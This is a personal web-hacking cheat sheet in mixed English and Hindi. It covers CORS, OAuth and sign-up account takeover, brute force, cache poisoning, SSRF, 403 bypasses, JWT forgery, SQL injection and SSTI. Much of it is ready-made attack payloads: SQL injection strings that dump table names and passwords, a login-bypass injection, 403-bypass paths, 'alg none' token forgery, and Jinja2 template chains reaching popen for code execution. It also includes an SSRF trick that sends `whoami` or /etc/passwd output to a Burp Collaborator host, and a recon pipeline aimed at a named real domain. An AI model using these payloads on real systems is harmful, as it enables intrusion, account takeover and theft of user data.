Special and Simple Bugs : required just enumeration of the web app:
CORS: in normal get request set Origin: https://evil.com {if there is no origin header then add it manually} , now if the server reflect: Access-Control-Allow-Origin: https://evil.com , then site is vulnerable with CORS [agar Access-COntrol-Allow-Credentials: true hai tab bhi site vulnerable hai]
authentication:
                 Sign Up:
                 * email verfication can be bypassed , fill registration form , and capture server response , email_verfied: False , set it to true
                 * if the web app has a  OAUTH feature then check sometimes what happen, we can create a account with a simple name ,email , password and other details, now what we have to do create an account with victim email and do not do authentication ,now when victim create an account with the OAuth third party apps then victim will directly login and in case of OAuth no requriment of setting the password so now you can login to victim account any time with the email and password that you set before victim create the account using OAuth
                 Sign In:
                 * no rate limit is set , because of that attacker can do brute force attack and take over the other user account completely
                      Two Factor Authentication:
                       * no rate limit is set , because of that attacker can do brute force on OTP parameter...
                       
LDAP injection: https://www.netsparker.com/blog/web-security/ldap-injection-how-to-prevent/ : if backend is using LDAP , then just put * as username and * as password , it will let you in
  
OAUTH: 
        in case Authorization code flow grant ( issemein authorization server pehle ek , autorization code deta hai, jisse phir authorization server ko bhejne par authorization token generate hota hai ): check it reusability , if it is generating multiple autorization token then it is vulnerable, check if the autorization token can be reused or not [ mtlb exprire autorization token se dobara se session cookie generate kr rahi hai ya nahi ,agar kr rahi hai toh woh vulnerable hai ] 
        URL redirection : jab bhi hum sign up with google par click krenge toh redirect_url parameter ko attacker site se change krke deklo 
                       
HTTP request Smuggling: 
                      key points:  \n = 1byte \r = 1byte , har request ki har line ki ending mein \r\n ka combination hota hai jo ki hidden hota hai isslye har line ki end mein 2bytes hamesha jodna chyein:
                      content length : simple decimal numbers
                      Transfer-Encoding: hexadecimal number
Dos attack:
         No length limit on password or any other field 
         refrence : https://hackerone.com/reports/738569
         No rate limiting on sending reset password otp or links to any user 
         refrence : https://hackerone.com/reports/751604
Search field attack: 
               GET request: go to tools -> BruteXSS-1 -> and launch script select the wordlist2.txt
Reflected Attack on Login and Registration form:
               Check Source code if web page is storing the input or not, if there is not filteration of inputs then reflected xss might be possible
Attack on Password Reset Link:
                            DOs, email spam etc
                            if it is including website host header then what we can do we can tr to change it

       HOW WEB CACHE OCCUR: if a request is going to cache , then it has two things key headers and paramerets and UNkeyed headers and parameters, keyed ke basis pe yein decide hota hai ki isse cache krne ki permission hai ya nahi, and unkeyed mein changes krne par agar woh changes responsemein bhi reflect ho ya usse bhi change krrde toh aab naya response cache server mein store hojata hai https://cpdos.org/
       
       Detection of Web CACHE POISONING:
         copy target url:
         open two terminals:
         Terminal 1)               while true; do wget "TARGET_URL" --header 'X-Forwarded-Host: cyberjutsu.io/#' -qO->/dev/null; echo "poisoning...";done               
         
         Terminal 2)                 while true; do wget "TARGET_URL" -qO-|grep "cyberjutsu.io"; echo "ping my payload..." ;done
         
         if the reflection was found then web cache poisoing is possible
         
 WEB CACHE DECEPTION:  cache mein sirf non sensitive information hi store hoti hai ,like public images ,css , js ,php files but kabhi bhi , PROFILE ya user sensitive information store nahi hoti, agar hum user sensitive information kisi aur extenion se store kr de cache mein toh sirf URL ke through bhi kisi ki information nikali ja sakti hai....
                                      HOW TO DO: if https://domain/userprofile is not chaching on server                      || har request ke baad hamesha age:0 hi bana rah raha hai toh it is not cacheing at all
                                      now if https://domain/userprofile/notexestence.css  ko krne par kuch server, userprofile hi dikhayenge and notexetence.css ko ignore kr denge  || esa mein har ek single request ke baad age badhta hi jaye toh smjh jao , https://domain/userprofile/nonexestence.css cache ho gaya and now koi bhi isse access kr sakta hai sirf URL ke saath
                                      
           SSRF: 
                  did this three commands for ssrf if you don't have all subdomains
                     gau -subs latoken.com; subfinder -d latoken.com -silent |waybackurls | gf ssrf | sort -u >> testblinkssrf.txt
                     cat testblinkssrf.txt | qsreplace "http://vcbm7glftmy2yh2ysw99yrejlar0fp.burpcollaborator.net" >> ssrfuzz.txt
                     ffuf -c -w ssrfuzz.txt -u FUZZ -t 200
           SSRF to RCE => 
           suppose you get ssrf in a url then => at last of burp collaborator link add ?`whoami` or ?`cat${IFS}/etc/passwd` and check coming request in burp suite may be you will found some rce
 AWS detection: how to check that domain is using s3 or not : 
 simple go to lazys3 tool : ruby lazys3 yahoo.com
Text Injection [suppose if a url is showing cannot GET / instead of 404 , means and if put and word in url which is reflecting then we can exploit it , 
https://example.com 
cannot GET  /
https://example.com/hello
cannot GET /hello
exploit:  https://example.com////example.com__has__been__moved__TO__[ attacker.com ]__Welcome_coupon_is_availabe_go_for_it
cannot GET /example.com__has__been__moved__TO__[ attacker.com ]__Welcome_coupon_is_availabe_go_for_it

]

Bypass 403:  1) BY URL manipulation , like adding ?.css , .php.jpeg , /viraj etc
             2) BY USing different HTTP Methods , Like instead of GET use POST request with Content-Length: 0 or curl -H "Content-Length: 0" -X POST URL
             3) By using extra slashes: https://example.com/wp-json/wp/v2/user => 403 Forbidden :::: https://example.com/wp-json/wp/v2//user => 200 
             && https://example.com/login.php?action=lostpassword => 403 Forbidden :::: https://example.com/login.php/?action=lostpassword => 200
             4) if https://example.com/admin = > 403 and https://example.com/user => 200 :::: then GET /user X-Original-URL: /admin or X-Override-URL: /admin or X-Rewrite-URL: /admin
             5) by trying different Payload:
             /accessible/..;/admin
             /.;/admin
             /admin;/
             /admin/~
             /./admin/./
             /admin?param
             /%2e/admin
             /admin#
             //admin//
             /admin.../
             //admin.../
             /./admin/
             /admin/.
             /admin%20/
             /%20admin%20/
             /%20admin%20/
             admin%20/page
             6)
             POST /xmlrpc
             Response: 403
             attack:
                   POST /
                   X-Original-URL: /xmlrpc
                   Response: 200
             you can also use: X-Override-URL ,X-Rewrite-URL

## JWT
              JWT token bypass
              By @HackerHumble
              Source: link1, link2, link3

              Here are 3 tips to bypass JWT token authentication.

              Tip #1:

              Capture the JWT.
              Change the algorithm to None.
              Change the content of the claims in the body with whatever you want e.g.: email: attacker@gmail.com
              Send the request with the modified token and check the result.
              Tip #2:

              Capture the JWT token.
              If the algorithm is RS256 change to HS256 and sign the token with the public key (which you can get by visiting jwks Uri / mostly it will be the public key from the site’s https certificate)
              Send the request with the modified token and check the response.
              You can party with the bounty if the backend doesn’t have the algorithm check.
              Tip #3: Check for proper server-side session termination (OTG-SESS-006):

              Check if the application is using JWT tokens for authentication.
              If so, login to the application and capture the token. (Mostly web apps stores the token in the local storage of the browser)
              Now logout of the application.
              Now make a request to the privileged endpoint with the token captured earlier.
              Sometimes, the request will be successful as the web apps just delete the token from browser and won’t blacklist the tokens in the backend.

SQL injection techinque =>

   Finding number of fields (or column) => for this best command is UNION => id=23 is param then => id=23' UNION SELECT 'test1'; -- - => gives sql error => id=23' UNION SELECT 'test1','test2'; -- - => again error => id=23' UNION SELECT 'test1','test2','test3'; -- - => no error => abb page pr + source code mein check kro ki test1,test2,test3,test4 mein se kuch bhi reflect ho raha hai ya nahi , agar kuch reflect ho raha hai toh hum usski jagah user() put krke reflection wali jagah pr username dekh sakte hai otherwise blind sql injection hi kro ya sqlmap use kro  [ the case might be complete different , we may not get any error with wrong number of less number of arguments , but as we move just 1 number above the number of coloumn it will give error for every query. ] 
  
  
   To get the table name , if we can use below technique , if we have a union based sql injection  (work on sqlite database only):
   id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() --+   ### with this we will get name of all availble tables starting from table being used in the query, but since output can be only single line so we will only get one table name from this query , to get other lines use below queries  
   id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1 --+  ### to print the other table name 
   id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1 --+  ### to print third table name 
   
   say value of nickName is reflecting and we are able to modify the query, then we can set value of nickName such that we will get all tables name as below
   
   make query such that it will update , nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%')  WHERE 1=1
   say we get tablename , usertable , now we can check all its coloumn name
   
   nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable')
   
   then extracting coloumns:
     nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable)
   
   ########## group_concat , will replace \n with , in the output and print the complete result in a single string, means no need to use limit 1,1 and limit 2,1 to print line by line result
   
   id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+  ### print all tables name together
   
   id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+  ## to get the different coloumn names of table_name users
   
   id=-1' union select 1,group_concat(username),3 from users --+  ## print all entries within the coloum username in table users

   http://localhost:81/sqli/Less-8/?id=1' AND (length(database())) = 8 --+   ### will check whether the size of database is 8 or not
   
   suppose we are on login page the we can assume query on server is like => 
      SELECT password FROM users WHERE username='user_name_given_by_us_on_the_login_page'  => if username not found then wrong credentials or if exist then this query will return the password stored in the table. 
      now what we can do is  => putting user_name_given_by_us_on_the_login_page' UNION SELECT 'playerx' AS password WHERE '1'='   in username field and playerx in password field => 
      SELECT password FROM users WHERE username='user_name_given_by_us_on_the_login_page' UNION SELECT 'playerx' AS password WHERE '1'='1'  = >   login will bypass
      
      what happen here the password from the table is selected as playerx means the password will be playerx for this particular check , password will not change in the table but will playerx will be used as password for this time. => note=> password must be stored as a plain text in the table

############################ SSTI ##########################################################
      If the app blindly takes a user input (such as username) and render it into a template. Then the user can inject arbitrary code which the template will evaluate.
      
         Vulnerable Source Code: 
            @app.route("/", methods=['GET'])
            def home():
            try:
                name = request.args.get('name') or None # get untrusted query param
                greeting = render_template_string(name) # render it into template
           
            here we can clearly see, that backend is just taking our input even withour filtering it , and rendering as it is to us, in render_template_string() function , if argument
            is passed inside of {{ }} , then it will get executed on python interactive, what it mean is that, {{ 5*5 }} , will same result as we get in ipython for 5*5 which is 25
            
               also => {{ import os;os.system('ls') }} => will list the content of current directory 
               
                        Note : for security reason, in JINJA2 Web app, we can not use import in template engine , so rarely we find any web application which is not using jinja2,
                        and vulnerable for SSTI , for only that web app, we can procedd for direct python script execution as shown in above example
              for jinja 2 type cases , we need to find such a module in which os module is import,
              in python everything is object , and every module needs something from other module, that's why even one module can import other module for its specific purpose,
              as 
              sys module import os , cache_warnings import sys etc, so if we have cache_warnings module , we can access sys and then os
              
              ************suppose we discover a SSTI , in one input when we put {{5*5}} it will get return 25 , 
                           so what we can do we can try for ''.__class__ , it will give str or <object % str> as an output , since '' is a string,
                           then we can check for base ''.__class__.__base__ since everything is object in python, it will print object as an output
                           now we can check for different subclasses , ''.__class_.__base__.__subclasses__() , the result will be different from machine to machine, because it depends on what we have downloded
                           we need to search for the subclasses which have imported os module in them or sys module because in sys module it imports os , so we can init them and os module will automatically will get imported,
                           say you found warnings.catch_warnings, then you must know its index, since subclasses() is an list, we need an argument of the item we want to init
                           say index is 140, so you can init it with global, then we can call sys module, 
                           ''.__class__.__base__.subclasses()[140].__init__.globals__['sys'].modules['os'].popen("id").read()
                           
                           we can also mro to get different subclasses => {{ ''.__class__.__mro__[1].__subclasses__() }}
                           
                           for rce : {{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}
